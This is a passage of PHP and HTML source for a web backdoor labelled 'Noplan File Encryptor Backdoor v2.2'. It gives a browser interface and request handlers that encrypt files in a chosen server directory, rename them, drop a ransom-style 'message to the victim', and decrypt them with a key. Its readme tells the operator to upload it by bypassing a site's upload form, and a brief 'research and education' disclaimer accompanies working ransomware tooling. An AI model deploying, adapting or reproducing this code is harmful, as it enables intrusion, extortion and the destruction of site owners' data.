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) center no-repeat;color:#f22405;font-family:courier;padding:50px}textarea{width:100%;resize:vertical;padding:15px;border-radius:5px;border:0;box-shadow:4px 4px 10px rgba(0,0,0,.06);height:100px}.centered{position:absolute;margin-top:5rem;height:600px;max-height:600px;width:60%;top:40%;left:50%;z-index:0;overflow:auto;padding:10px;transform:translate(-50%,-50%)}label{position:relative;padding-left:30px;cursor:pointer}input[type=text]{display:block;width:100%;margin:10px 0;padding:10px}.type-1{border-radius:10px;border:1px solid #eee;transition:.3s border-color}.type-1:hover{border:1px solid #aaa}.button{appearance:none;-webkit-appearance:none;padding:10px;border:1px solid #fff;background-color:red;color:#fff;font-weight:600;border-radius:5px;width:100%}button:hover{background-color:#fff;color:red;border:1px solid red;cursor:pointer}hr.style{border:0;height:1px;background-image:linear-gradient(to right,rgba(252,19,3,0),rgba(252,19,3,.75),rgba(0,0,0,0))}#overlay{position:fixed;width:100%;height:100%;top:0;left:0;right:0;bottom:0;background-color:rgba(66,0,0,.7);z-index:-9999;cursor:pointer}::-webkit-scrollbar{width:10px}::-webkit-scrollbar-track{box-shadow:inset 0 0 5px grey;border-radius:10px}::-webkit-scrollbar-thumb{background:red;border-radius:10px}::-webkit-scrollbar-thumb:hover{background:#b30000}.header{text-align:center;}.menu a{text-decoration:none;color:#fff;background-color:red;padding:8px;width:150px;border:1px solid #fff;border-radius:5px;}.menu a:hover{text-decoration:none;color:red;background-color:#fff;padding:8px;border:1px solid red}.readme{background-color:rgba(0,0,0,.5);border:.5px solid #fff;padding:20px;color:#32ff0a;margin-top:2rem}.readme p,li{text-align:justify;font-size:12px}.readme h2,h5{color:red;font-family:arial}small{color:#fff;font-family:verdana}.title{color:#fff;text-shadow:0 0 10px rgba(55,255,0,.7)}.message {border:0.5px solid white;background-color: rgba(0,0,0,0.7);color:#00CC00;font-size: 12px;padding:20px;height:200px;overflow:auto;}
		</style>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
	</head>
	<body>
		<div id="overlay"></div>
		<div class="centered">
			<div class="header">
				<h1 class="title"><?= $title; ?></h1>
				<p style="font-size:11px;color:white;">Current Path Location : <?= WHOAMI;?></p>

				<hr class="style">
				<br/>
				<div class="menu">
					<a href="?m=enc">Encrypt</a>
					<a href="?m=dec">Decrypt</a>
					<a href="?m=readme">Readme</a>
				</div>
			</div>
			<br/>
		<!-- ENCRYPT FORM -->
		<?php
		if(isset($_GET['m']) && preg_replace('/[^a-z]*$/', '', $_GET['m']) == 'enc') { ?>

			<form id="form" action="?act=encrypt" method="post">
				Key <input type='text' id="key" name='key' placeholder='Your Key. Leave blank if you choose random key.'>
				Target <input type='text' id="path" name='path' placeholder='Target Path. Ex: /../upload/ or /upload/' value="testing2" required>
				Encrypted extension <input type="text" id="ext" name="enc_ext" placeholder='Encrypted files extension. Default : noplan'>
				Message to your Target <textarea id="victim_msg" placeholder="Message to your Target..." style="margin-top:1rem;" name="message"></textarea>
				<button type="submit" id="encrypt" name="encrypt" style="margin-top:1rem;" class="button">Encrypt!</button>
			</form>

			<div id="message" class="message default_msg"> noplan@earth$ sudo noplan show copyright<br/>Noplan Alderson &copy; <?= date('Y');?> Now and Forever
			</div>
			<div id="typewritter" class="message result" style="display:none;">
				noplan@earth$ sudo noplan do encrypt<br/>
				Encrypting files in <div class="config"></div>
				<br/><br/>...<br/>
				<div class="terminal_process"></div>
			</div>
			<script>
		    document.getElementById("encrypt").addEventListener("click", function(event){
		    	event.preventDefault();
		        $('#encrypt').html('Checking File...');
		        var formAction = $("#form").attr('action');
		        var dataConfig = {
		            key: $("#key").val(),
		            path: $("#path").val(),
		            enc_ext: $("#ext").val(),
		            message: $("#victim_msg").val(),
		            encrypt: $("#encrypt").val()
		        };
		        $.ajax({
		            type: "POST",
		            url: formAction,
		            data: dataConfig,
		            dataType: 'json',
		            success: function(data) {
		                if (data.status == 1) {
		                	$('.default_msg').hide();
		                    $('.result').show();
		                    $('.config').html(data.path + ' as ' + data.ext + ' with key ' + data.key);
		                    $('.terminal_process').html(data.result);
		                    new TypingText(document.getElementById("typewritter"),1,function(t){var i=new Array("_","_","_","_");return" "+i[t.length%i.length]}),TypingText.runAll();
		        			$('#encrypt').html('Encrypt!');
		                }
		            }
		        });
		        return false;
		    });
			</script>
		<!-- END ENCRYPT FORM -->

		<!-- DECRYPT FORM -->
		<?php } elseif(isset($_GET['m']) && $_GET['m'] == 'dec') { ?>
		
			<form id="form" action="?act=decrypt" method="post">
				Key <input type='text' id='key' name='key' placeholder="Your Key" required><br/>
				Target <input type='text' id='path' name='path' placeholder="Path Target. Ex: /uploads/images/ or ../application/database/"><br/>
				Encrypted extension <input type="text" id='ext' name="enc_ext" placeholder="Encrypted file extension which you decrypt. Default : noplan">
				<button type="submit" id='decrypt' name="decrypt" style="margin-top:1rem;" class="button">Decrypt!</button>
			</form>
			<div id="message" class="message default_msg"> noplan@earth$ sudo noplan show copyright<br/>Noplan Alderson &copy; <?= date('Y');?> Now and Forever
			</div>
			<div id="typewritter" class="message result" style="display:none;">
				noplan@earth$ sudo noplan do decrypt<br/>
				<div class="config"></div>
				<br/><br/>...<br/>
				<div class="terminal_process"></div>
			</div>		
			<script>
		    document.getElementById("decrypt").addEventListener("click", function(event){
		    	event.preventDefault();
		        $('#decrypt').html('Checking File...');
		        var formAction = $("#form").attr('action');
		        var dataConfig = {
		            key: $("#key").val(),
		            path: $("#path").val(),
		            enc_ext: $("#ext").val(),
		            decrypt: $("#decrypt").val()
		        };
		        $.ajax({
		            type: "POST",
		            url: formAction,
		            data: dataConfig,
		            dataType: 'json',
		            success: function(data) {
		                if (data.status == 1) {
		                	$('.default_msg').hide();
		                    $('.result').show();
		                    $('.config').html('Decrypting files ' + data.ext + ' extension in '+ data.path + ' directory with key ' + data.key);
		                    $('.terminal_process').html(data.result);
		                    new TypingText(document.getElementById("typewritter"),1,function(t){var i=new Array("_","_","_","_");return" "+i[t.length%i.length]}),TypingText.runAll();
		        			$('#decrypt').html('Decrypt!');
		                }
		            }
		        });
		        return false;
		    });	
			</script>
		<!-- END DECRYPT FORM -->

		<!-- README -->
		<?php } else { ?>

			<div class="readme">
				<h2>Noplan File Encryptor Backdoor v2.2</h2>

				<p>Upload this file with bypassing site's form upload and Remote from browser. Fill the configuration form and let this file do the magic! The files will be encrypted with AES-128-CBC.</p>
				
				<h5>DISCLAIMER!!!</h5>
				<p>This software is made with the aim of research and education. Please use this software as it should. Whatever you do with this software, at your own risk. The author is not responsible for damage caused by this software.</p>

				<h5>WARNING!!!</h5>
				<p>Guessing the decryptor key and entering it randomly will cause the encrypted file never to be recover forever.</p>
				<p>Never encrypt an encrypted files, or they're won't be recovered.</p>

				<h5>HOW TO USE</h5>
				<ol>
					<li>Encrypting File</li>
					<ul>
						<li>Specify the encryption key and type in the key field. If the key field is empty, the key is automatically generated by the system and will appear after the file encryption process is successful. Save your key to decrypting file</li>
						<li>Determine the target file directory that you are encrypting. Example: /uploads/images/ or /../../application/databases/</li>
						<li>Specify the encrypted file extension. Default: noplan</li>
						<li>Write a message to the victim. The message will be written in the file format .readme</li>
					</ul>
					<br/>
					<li>Decrypting File</li>
					<ul>
						<li>Enter your key in the key field</li>
						<li>Determine the target file directory that you are decrypting. Example: /uploads/images/ or /../../application/databases/</li>
						<li>Specify the encrypted file extension. Default: noplan</li>
					</ul>
				</ol>
			</div>
			<br/>
		<?php } ?>
		<!-- END README -->

		</div>
		<script>
		TypingText=function(t,i,e,r){void 0!==document.getElementById&&void 0!==t.innerHTML?(this.element=t,this.finishedCallback=r||function(){},this.interval=void 0===i?100:i,this.origText=this.element.innerHTML,this.unparsedOrigText=this.origText,this.cursor=e||"",this.currentText="",this.currentChar=0,this.element.typingText=this,""==this.element.id&&(this.element.id="typingtext"+TypingText.currentIndex++),TypingText.all.push(this),this.running=!1,this.inTag=!1,this.tagBuffer="",this.inHTMLEntity=!1,this.HTMLEntityBuffer=""):this.running=!0},TypingText.all=new Array,TypingText.currentIndex=0,TypingText.runAll=function(){for(var t=0;t<TypingText.all.length;t++)TypingText.all[t].run()},TypingText.prototype.run=function(){if(!this.running)if(void 0!==this.origText)if(""==this.currentText&&(this.element.innerHTML=""),this.currentChar<this.origText.length){if("<"==this.origText.charAt(this.currentChar)&&!this.inTag)return this.tagBuffer="<",this.inTag=!0,this.currentChar++,void this.run();if(">"==this.origText.charAt(this.currentChar)&&this.inTag)return this.tagBuffer+=">",this.inTag=!1,this.currentText+=this.tagBuffer,this.currentChar++,void this.run();if(this.inTag)return this.tagBuffer+=this.origText.charAt(this.currentChar),this.currentChar++,void this.run();if("&"==this.origText.charAt(this.currentChar)&&!this.inHTMLEntity)return this.HTMLEntityBuffer="&",this.inHTMLEntity=!0,this.currentChar++,void this.run();if(";"==this.origText.charAt(this.currentChar)&&this.inHTMLEntity)return this.HTMLEntityBuffer+=";",this.inHTMLEntity=!1,this.currentText+=this.HTMLEntityBuffer,this.currentChar++,void this.run();if(this.inHTMLEntity)return this.HTMLEntityBuffer+=this.origText.charAt(this.currentChar),this.currentChar++,void this.run();this.currentText+=this.origText.charAt(this.currentChar),this.element.innerHTML=this.currentText,this.element.innerHTML+=this.currentChar<this.origText.length-1?"function"==typeof this.cursor?this.cursor(this.currentText):this.cursor:"",this.currentChar++,setTimeout("document.getElementById('"+this.element.id+"').typingText.run()",this.interval)}else this.currentText="",this.currentChar=0,this.running=!1,this.finishedCallback();else setTimeout("document.getElementById('"+this.element.id+"').typingText.run()",this.interval)},new TypingText(document.getElementById("message"),1,function(t){var i=new Array("_","_","_","_");return" "+i[t.length%i.length]}),TypingText.runAll();
		</script>
	</body>
</html>

<!-- JSON SECTION / FORM ACTION -->
<?php 
}
elseif(isset($_GET['act']) && $_GET['act'] == 'encrypt') 
{
	if(isset($_POST['encrypt']))
	{
		$keygen = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&*|\+=-';
		$key = (isset($_POST['key']) && $_POST['key'] !== '') ? $_POST['key'] : substr(str_shuffle($keygen), 0, 32);
		$path = $_POST['path'];
		$enc_ext = (isset($_POST['enc_ext']) && $_POST['enc_ext'] !== '') ? '.'.$_POST['enc_ext'] : '.noplan';
		$message = $_POST['message'];
		
		$config['_key'] = $key;
		$config['_src_path'] = $path;
		$config['_ext_enc'] = $enc_ext;
		$config['_msg'] = $message;

		$encrypt = new Noplan_encryptor($config);
		$encrypt->dir_listing();

		sleep(5);
		$encrypt->create_message();
		$encrypt->do_encrypt();
		$array_data = array('status' => 1, 
			'result' => $encrypt->show_result(),
			'key' => $key,
			'path' => BASEPATH . str_replace('/', DIRECTORY_SEPARATOR, $path),
			'ext' => $enc_ext
		);
		echo json_encode($array_data);
	}
}
elseif (isset($_GET['act']) && $_GET['act'] == 'decrypt') 
{
	if(isset($_POST['decrypt']))
	{
		$key = $_POST['key'];
		$path = $_POST['path'];
		$enc_ext = (isset($_POST['enc_ext']) && $_POST['enc_ext'] !== '') ? '.'.$_POST['enc_ext'] : '.noplan';
		
		$config['_key'] = $key;
		$config['_src_path'] = $path;
		$config['_ext_enc'] = $enc_ext;
		
		$decrypt = new Decryptor($config);
		$decrypt->dir_listing();

		sleep(5);
		$decrypt->do_decrypt();
		$array_data = array('status' => 1, 
			'result' => $decrypt->show_result(),
			'key' => $key,
			'path' => BASEPATH . str_replace('/', DIRECTORY_SEPARATOR, $path),
			'ext' => $enc_ext
		);
		echo json_encode($array_data);
	}
}
else
{
	header('location:?m=readme');
	exit;
}
?>